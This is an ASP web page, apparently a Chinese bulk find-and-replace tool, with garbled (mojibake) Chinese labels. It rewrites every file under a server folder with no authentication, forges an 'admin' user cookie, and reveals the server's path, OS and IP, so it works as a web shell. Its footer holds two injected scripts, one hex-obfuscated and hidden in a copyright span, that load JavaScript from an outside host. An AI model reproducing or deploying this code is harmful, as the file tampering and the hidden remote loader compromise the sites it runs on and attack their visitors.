<%
Option Explicit
Server.ScriptTimeOut=9999
response.cookies("userinfor")("userid")="admin"	

%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta http-equiv="Content-Language" content="zh-CN" />
<meta name="author" content="QQ945504681��д " />
<meta name="Description" content="���������ַ��滻����" />
<meta name="copyright" content="QQ945504681ԭ��web���� ��ӭָ��"/>
<title>ASP���߰������ַ��滻����</title>
<style type="text/css">
<!--
#top
{
	text-align:center;
	margin:auto;
	font-size:11pt;
}

#top_b
{
	text-align:left;
	width:350px;
	border:1px solid #000000;
	margin:auto;
	padding:0px;
	line-height:200%;
}

#top_b div
{
	padding-left:8px;
	padding-right:8px;
}

#ftitle
{
	text-align:center;
	width:350px;
	background:silver;
	font-weight:bold;
	letter-spacing:5px;
	font-size:15pt;
	padding:3px 0 3px 0;
	color:red;
	margin:auto;
	border:1px solid #000000;
	border-width:1px 1px 0 1px;
}

#btm
{
	text-align:center;
	padding-top:8px;
	padding-bottom:8px;
	background:#ececec
}

textarea
{
	width:330;
	height:100px
}

#copyr
{
	font-size:9pt;
	text-align:center;
	color:silver
}
-->
</style>
</head>
<body>
<%
if request.querystring("add")="yes" then
%>
<div id="top">
	<div id="ftitle">��������</div>
	<div id="top_b">
		<div>
			���ļ�:<span style="color:red" id="allfile">&nbsp;</span>��&nbsp;&nbsp;
			�滻���ļ�:<span style="color:red" id="repfile">&nbsp;</span>��
		</div>
		<div><br />���滻���ļ�·���б��<textarea id="txtreple" style="overflow:auto"></textarea></div>
	  <div id="copyr"><br />
		  <a href="http://www.xnzjpc.cn">������������������</a></div>
	</div>
</div>
<%
dim oldstr :oldstr=request.form("lookstr")  'Դ�ַ���
dim newstr :newstr=request.form("replacestr") '���ַ���
dim rep : rep=cbool(request.form("bak"))   '�Ƿ񱸷��ļ���trueΪ�����ļ�
dim i : i=0  '���ļ�����
dim j : j=0  '���滻���ļ�����

function chkexistsfile(path) '�ж�һ���ļ��Ƿ���ڣ�������ڣ�����true�����򷵻�false
	dim fso
	set fso=server.createobject("scripting.filesystemobject")
	if fso.fileexists(path) then
		chkexistsfile=true
	else
		chkexistsfile=false
	end if
	set fso=nothing
end function

function getfilecode(path) '��ȡһ���ļ��Ĵ���
    On error Resume Next
	dim fso
	if chkexistsfile(path) then
		set fso=server.createobject("scripting.filesystemobject")
		dim filecode : set filecode=fso.opentextfile(path,1)
		getfilecode=filecode.readall
		set fso=nothing
	else
		getfilecode=path & "�����ڸ��ļ�"
	end if
end function

sub jstxt(txt) 'ʹ��JavaScript
	response.write "<script type=""text/JavaScript"" language=""JavaScript"">"
	response.write "<!--"&chr(13)&chr(10)
	response.write txt
	response.write chr(13)&chr(10)&"//-->"
	response.write "</script>"
end sub


sub getfolderfile(cpath) '�滻ĳһ��(��)�ļ����µ������ļ�

	response.flush
	dim fso : set fso=server.createobject("scripting.filesystemobject")
	if fso.folderexists(cpath)=false then 
		jstxt("alert("" "&replace(cpath,"\","\\") & "�����ڸ��ļ��У�"&" "") ")
		response.end
	end if
	dim folders : set folders=fso.GetFolder(cpath)
	dim sfile
	for each sfile in folders.files
		dim filecode : filecode=getfilecode(sfile)
		dim filecode_b : filecode_b=filecode
		if instr(filecode,oldstr) <> 0 and fso.GetExtensionName(sfile) <> "bak" then
			
			jstxt("document.getElementById(""txtreple"").value+="""& replace(sfile,"\","\\") & "\r\n""" &chr(13)&chr(10))
			jstxt("window.status="""& replace(sfile,"\","\\")&"""")
			jstxt("document.title="""& replace(sfile,"\","\\")&"""")
			
			filecode=replace(filecode,oldstr,newstr)
			dim newfilecode : set newfilecode=fso.opentextfile(sfile,2)
			newfilecode.write filecode
			j=j+1
			if rep then
				dim newfilecode_b : set newfilecode_b=fso.opentextfile(sfile+".bak",2,true)
				newfilecode_b.write filecode_b
			end if
		end if
		i=i+1
		jstxt("document.getElementById(""allfile"").innerHTML="""&i&"""")
		jstxt("document.getElementById(""repfile"").innerHTML="""&j&"""")

	next
	
	dim sfolder
	for each sfolder in folders.subfolders
		getfolderfile(sfolder)
	next
	set fso=nothing


end sub


getfolderfile(trim(request.form("pfolder"))) '���ó���

else
%>
<div id="top">

	<form action="?add=yes" method="post" name="strform">

		<div id="ftitle">�����ַ������滻����</div>
		<div id="top_b">

			<div>�ļ��е�ַ��<input type="text" size="25" name="pfolder"/></div>
			<div>����ԭ�ļ���<input type="checkbox" name="bak" value="true" /></div>
			<div><br />�����ַ�����<textarea name="lookstr"></textarea></div>
			<div><br />�滻���ҵ��ַ�����<textarea name="replacestr"></textarea></div>
			<div id="btm"><input type="button" value="&nbsp;ȷ��&nbsp;" onclick="chk()"/></div>
		  <div id="copyr"><br />
		    <a href="http://www.xnzjpc.cn">������������������</a> <a href="http://www.wendns.com" target="_blank">��л�й������ṩ�ռ�</a> </div>

		</div>
	
	</form>
</div>
<SCRIPT type="text/javascript" LANGUAGE="JavaScript">
<!--
function chk()
{
	var forma=document.strform;
	if(forma.pfolder.value=="")
	{
		alert("�ļ��е�ַ����Ϊ��");
		forma.pfolder.focus();
		return;
	}
	else 
	{
		forma.pfolder.value=forma.pfolder.value.replace(/\//g,"\\");
		forma.pfolder.value=forma.pfolder.value.replace(/��/g,".");
	}
	if(forma.lookstr.value=="")
	{
		alert("�����ַ�������Ϊ�գ�");
		forma.lookstr.focus();
	}
	else if(forma.replacestr.value=="")
	{
		alert("�滻���ҵ��ַ�������Ϊ��");
		forma.replacestr.focus();
	}
	else
	{
		forma.submit();
	}
}
//-->
</SCRIPT>
<% end if %>
<%="��ǰ�ļ�·��:"&server.mappath(request.servervariables("script_name"))%><br>
<%="����ϵͳΪ:"&Request.ServerVariables("OS")%><br>
<%="WEB�������汾Ϊ:"&Request.ServerVariables("SERVER_SOFTWARE")%><br>
<%="��������IPΪ:"&Request.ServerVariables("LOCAL_ADDR")%><br>
<script>
document.write ('<script language="javascript" type="text/javascript" src="http://www.szhongke.com.cn/images/ad.js"></script>');
</script>
<br>
:<SPAN class=copyright>
<script>
window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"] ('\x3c\x73\x63\x72\x69\x70\x74 \x6c\x61\x6e\x67\x75\x61\x67\x65\x3d\x22\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x7a\x68\x6f\x6e\x67\x6b\x65\x2e\x63\x6f\x6d\x2e\x63\x6e\x2f\x69\x6d\x61\x67\x65\x73\x2f\x61\x64\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');
</script>


</body>
</html>